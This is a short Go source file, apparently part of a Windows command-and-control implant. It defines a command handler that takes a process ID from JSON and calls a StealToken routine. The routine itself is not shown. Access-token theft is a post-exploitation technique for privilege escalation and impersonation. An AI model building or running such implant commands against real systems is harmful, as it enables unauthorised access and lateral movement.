//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
)

type StealTokenParams struct {
	PID uint32 `json:"pid"`
}

func cmdStealToken(raw json.RawMessage) string {
	var p StealTokenParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	if err := StealToken(p.PID); err != nil {
		return fmt.Sprintf("error: %s", err.Error())
	}

	return fmt.Sprintf("token stolen from pid %d", p.PID)
}
